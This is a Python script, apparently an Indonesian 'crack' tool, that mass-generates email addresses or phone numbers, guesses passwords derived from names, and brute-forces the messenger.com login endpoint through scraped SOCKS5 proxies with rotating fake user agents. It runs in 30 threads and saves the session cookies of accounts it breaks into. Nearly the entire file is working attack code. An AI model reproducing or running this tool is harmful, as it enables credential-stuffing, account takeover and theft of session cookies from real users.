import requests,bs4,json,os,sys,random,datetime,time,re,uuid,string
import urllib3,rich,base64
from string import *
from time import time as kontol
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from datetime import datetime
from rich.text import Text as tekz
pretty.install()
CON=sol()
cokbrut=[]
ugen=[]
hah=[]
ugen2=[]
ses=requests.Session()
princp=[]
try:
	prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('proxy.txt','w').write(prox)
except Exception as e:
	print('You Internet Has Problems......')
prox=open('proxy.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Redmi 4A Build/N2G47H)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
	
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='Redmi 4A Build/MMB29M; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 hola_android'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (iPhone14,'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='U; CPU iPhone OS 15_4 like Mac OS X'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/602.1.50 (KHTML, like Gecko) Version/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/19E241 Safari/602.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; U; Android 7.0; es-us;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 4 Build/NRD90M)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.2'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 9 Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 9 Pro)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/105.0.5195.19 Mobile Safari/537.36 TwitterAndroid'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
sys.stdout.write('\x1b]2;TOOLS : PRIBADI\x07')
#========= WARNA ========#			
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
x = '\33[m' # DEFAULT
x = '\33[m' # DEFAULT
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m'
b = '\33[1;96m'
p = '\x1b[0;34m'
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
A = '\x1b[1;90m' 
asu = random.choice([m,k,h,u,b,p])
#========= MENU BULAN1 ========#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.now().day
bln = dic[(str(datetime.now().month))]
thn = datetime.now().year
okc = 'PAL-OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'PAL-CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#========= TAHUN ========#			
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['6155']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
#========= MENU JALAN ========#				
def jalan(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	menu()
#========= MENU JALAN ========#					
#========= LOGO KONTOL ========#				
def logo():
	clear()
	print(f'''{x}
888888  dP"Yb  88""Yb 88 8888b.  
88__   dP   Yb 88__dP 88  8I  Yb 
88""   Yb   dP 88"Yb  88  8I  dY 
88      YbodP  88  Yb 88 8888Y
{h}---------------------------------------{x}
 AUTHOR: DARK FORID 
 STUTAS: TEST
 VERSION : TRIAL
{h}---------------------------------------{x}''')  
#========= MENU ========#			
def menu():
	clear()
	logo()
	print(f'{J}(1) {P}Crack from Email\n{J}(2) {P}Crack from Number\n{J}(3) {P}Crack from File\n{J}(4) {P} Results Crack')
	___Sllowly_ID____ = input(f'{P}[{H}?{P}]Couse : ')
	if ___Sllowly_ID____ in ['1']:Email()
	elif ___Sllowly_ID____ in ['2']:Nomor()
	elif ___Sllowly_ID____ in ['3']:File()
	elif ___Sllowly_ID____ in ['4']:Result()
	else:
		print(f' pilih yang benar ');time.sleep(3);back()
#========= CRACK EMAIL ========#					
def Email():
	clear()
	logo()
	dump=[]
	rc = random.choice
	rr = random.randint
	xc = ['nazri','nizar','reni','aidil','yusup','yusep','sidik','encas','erika','ika','agil','lang','ling','lung','ani','keyla','septi','cepi','galuh','rona','ronaldo','ado','deon','ratu','ara','nia','nina','panji','heru','gaga','ega','agnes','ilma','puji','pujia','uji','hesti','reksa','bulan','alip','alif','sahri','raisa','mela','mella','cucu','ria','sarah','bunga','vina','cia','tiya','candra','bilal','fatimah','arya','kevin','bima','nurul','suparhan','ahmad','mahmud','asep','ramdan','saputra','kurnia','ramdani','hilda','mita','miya','ayu','gopur','tia','bono','mutiara','arin','wiwin','winda','penita','iyus','herlan','dinda','nda','naya','niya','aca','bandros','refan','wapda','rahman','maman','mimin','fitrah','adit','adat','fiki','aulia','tata','enung','esih','jajang','febi','ismi','wida','sanji','regi','rega','ferdi','firman','jimi','mawar','ratna','dimas','sasa','tia','tini','medusa','dewi','winda','setia','putri','danil','galang','gilang','denis','deni','sela','nabil','sinta','amel','melia','putra','telor','sabun','nia','kira','mela','mila','lisa','lida','lidi','ali','jaya','kiki','pian','pita','juwita','junita','nita','anisa','nisa','sani','sari','uje','uji','olip','oli','fikar','nur','siti','aji','oji','rada','imas','mia','tuti','tia','ima','sendi','febian','rima','raka','rati','jiman','dodi','reza','yani','galih','hia','siva','opik','kamal','jamal','linda','lida','ida','adi','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','junior','asep','pertama','pratama','anakff']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep','ganteng','official','0123','01234','12345','123456','marni','somat','11','22','33','44','55','66','77','88','99','1010']
	global ok , cc
	nama = input(f'{P}[{H}?{P}] Input Your Target Name : ')
	if 'kontol' in str(nama):
		print(f'{P}[{H}?{P}]Enter a name do not leave it blank ')
		time.sleep(3);exit()
	doma = input(f'{P}[{H}?{P}]domain (ex:@gmail.com) : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f'{P}[{H}?{P}]Enter The Domain Correctly ')
		time.sleep(3);exit()
	jumlah = input(f'{P}[{H}?{P}]Total dump (max:10000) : ')
	for xyz in range(int(jumlah)):
		AA = nama
		BB = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
		CC = doma
		DD = f'{AA}{str(rc(BB))}{CC}'
		if DD in id:pass
		else:id.append(DD+'|'+nama)
		if len(dump)==999999:setting()
		sys.stdout.write(f"\r managed to collect  {asu}{len(id)} {P}emails...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()
#========= CRACK NOMOR ========#					
def Nomor():
	clear()
	logo()
	depan = input(f'{P}[{H}?{P}] Enter Number(Example > 017 019 018) : ')
	if len(depan)==3:pass
	else:exit(f'{P}[{H}?{P}] contoh awalan nomor 089')
	jumla = input(f'{P}[{H}?{P}] Put Limit : ')
	for x in range(int(jumla)):
		rr = random.randint
		A1 = depan
		B1 = rr(1111,9999)
		C1 = rr(1,9)
		D1 = f'{A1}{C1}-{str(rr(1111,9999))}-{str(B1)}'
		if D1 in id:pass
		else:id.append(D1+'|123456')
		print(f'\r{P}[{H}?{P}]  berhasil mengumpulkan %s nomor '%(len(id)),end='')
		sys.stdout.flush()
	setting()	
#========= CRACK FILE ========#			
def File():
	clear()
	logo()
	try:
		fileX = input (f'{P}[{H}#{P}] masukkan nama file : ')
		for line in open(fileX, 'r').readlines():
			id.append(line.strip())
		setting()		
	except IOError:
		exit(f"{P}[{H}#{P}]file {H}%s {J}not found"%(fileX))
#========= HASIL CRACK ========#		
def Result():
	clear()	
	logo()
	print(f'{J}(1) {P}Hasil {h}OK{x} Anda ')
	print(f'{J}(2) {P}Hasil {k}CP{x} Anda ')
	kz = input(f' Couse : ')
	if kz in ['02','2']:		
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f' file tidak di temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f' anda tidak memiliki hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[0%s] %s {K}%s {x}Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+f' {K}'+str(len(hem))+f' {x}Account'+x)
			geeh = input(f' Pilih : ')			
			try:geh = lol[geeh]
			except KeyError:
				print(f' {P}pilih yang benar...')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f' {P}file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}*---> {K}{cpkuni[0]}{P}│{K}{cpkuni[1]}')
				nocp +=1			
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['01','1']:		
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f' {P} file tidak di temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f' {P} anda tidak mempunyai fileOK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[%s] %s {H}%s{x} Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[%s] %s {H} %s {x}Account'%(cih,isi,(len(hem))))
			geeh = input(f' Pilih : ')			
			try:geh = lol[geeh]
			except KeyError:
				print(f' {P}pilih yang bener kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f' {P}file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}*---> {h}{cpkuni[0]}{P}│{H}{cpkuni[1]}{P}│{h}{cpkuni[2]}{x}')
				nocp +=1		
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print(f' {P}pilih yang bener kontol ')
		back()
#========= MENU SETTING ========#					
def setting():
	if len(id)==0:
		exit(f'{P}[{H}#{P}] id tidak publik')
	for bacot in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,bacot)
	clear()
	logo()
	pwplus=input('[=] Password Manual ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input('[=] Enter Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	password()
#========= PASSWORD ========#				
def password():
	clear()
	logo()
	with tred(max_workers=30) as pool:
			for akun in id2:
				idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
				depan = nama.split(" ")[0]
				pwv = []
				if len(nama)<=5:
					if len(depan)<=1 or len(depan)<=2:
						pass
					else:
						pwv.append(depan+"09")
						pwv.append(depan+"12")
						pwv.append(depan+"21")
						pwv.append(depan+"22")
						pwv.append(depan+"23")
						pwv.append(depan+"123")
						pwv.append(depan+"1234")
						pwv.append(depan+"12345")
						pwv.append(depan+"123456")
				else:
					if len(depan)<=1 or len(depan)<=2:
						try:
							tengah = nama.split(" ")[1]
							if len(tengah)<=3:
								pass
							else:
								pwv.append(tengah+"09")
								pwv.append(tengah+"12")
								pwv.append(tengah+"21")
								pwv.append(tengah+"22")
								pwv.append(tengah+"23")
								pwv.append(tengah+"123")
								pwv.append(tengah+"1234")
								pwv.append(tengah+"12345")
								pwv.append(tengah+"123456")
								pwv.append(nama)
						except:
							try:
								belakang = nama.split(' ')[2]
								if len(belakang)<=3:pass
								else:
									pwv.append(belakang+"09")
									pwv.append(belakang+"12")
									pwv.append(belakang+"21")
									pwv.append(belakang+"22")
									pwv.append(belakang+"23")
									pwv.append(belakang+"123")
									pwv.append(belakang+"1234")
									pwv.append(belakang+"12345")
									pwv.append(belakang+"123456")
									pwv.append(nama)
							except:pwv.append(nama)
					else:
						pwv.append(nama)
						pwv.append(depan+"09")
						pwv.append(depan+"12")
						pwv.append(depan+"21")
						pwv.append(depan+"22")
						pwv.append(depan+"23")
						pwv.append(depan+"123")
						pwv.append(depan+"1234")
						pwv.append(depan+"12345")
						pwv.append(depan+"123456")
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'async' in method:
					pool.submit(crackasync,idf,pwv)
				else:
					pool.submit(crackasync,idf,pwv)
	print()
	print(f'\r{A}[{asu}±{A}] {P}crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
#========= METODE ASYNC ========#			
def crackasync(idf,pwv):
	global loop,ok,cp
	ewe = random.choice([m,k,h,u,b,p])
	sys.stdout.write(f"\r{ewe}[PRIVAT]{x} ({P}{loop}{P}|{P}{len(id)}{P}) {H}OK-{ok}{P}")
	sys.stdout.flush()
	ua2 = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			headers = {
             "Host": "www.messenger.com",
             "Connection": "keep-alive",
             "Content-Length": "267",
             "Cache-Control": "max-age=0",
             "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
             "sec-ch-ua-mobile": "?0",
             "sec-ch-ua-platform": '"Linux"',
             "Upgrade-Insecure-Requests": "1",
             "Origin": "https://www.messenger.com",
             "Content-Type": "application/x-www-form-urlencoded",
             "User-Agent": ua2,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "Sec-Fetch-Site": "same-origin",
             "Sec-Fetch-Mode": "navigate",
             "Sec-Fetch-User": "?1",
             "Sec-Fetch-Dest": "document",
             "Referer": "https://www.messenger.com/",
             "Accept-Encoding": "gzip, deflate, br",
             "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",
			}
			reqs = ses.get("https://www.messenger.com/").text
			datr = re.search('_js_datr","(.*?)",', str(reqs)).group(1)
			data = {
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(reqs)).group(1),
             "lsd":re.search('name="lsd" value="(.*?)"', str(reqs)).group(1),
             "initial_request_id":re.search('name="initial_request_id" value="(.*?)"', str(reqs)).group(1),
             "timezone":"-420",
             "lgndim":re.search('name="lgndim" value="(.*?)"', str(reqs)).group(1),
             "lgnrnd":re.search('name="lgnrnd" value="(.*?)"', str(reqs)).group(1),
             "lgnjs":"n",
             "email":idf,
             "pass":"Sungkem Puh Sepuhh",
             "login":"1",
             "persistent":"1",
             "default_persistent":""
			}
			headers.update({"Cookie":f"wd=980x1715; dpr=2; _js_datr={datr}"})
			break
		except:pass
	for pw in pwv:
		try:
			data.update({"pass":"".join(pw)})
			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, allow_redirects=False)		
			if 'c_user' in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r{h}[Dark-OK] {u}{idf} | {u}{pw}{x}\n{k}Cookie == {h}{kuki}{x}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				cp+=1
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				print(f'\r{M}[ERROR-CP] {M}{idf} | {M}{pw}{N}')				
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#========= MENU MAIN  ========#			
if __name__=='__main__':
	try:os.mkdir('Dark-OK')
	except:pass
	try:os.mkdir('Error-CP')
	except:pass
	menu()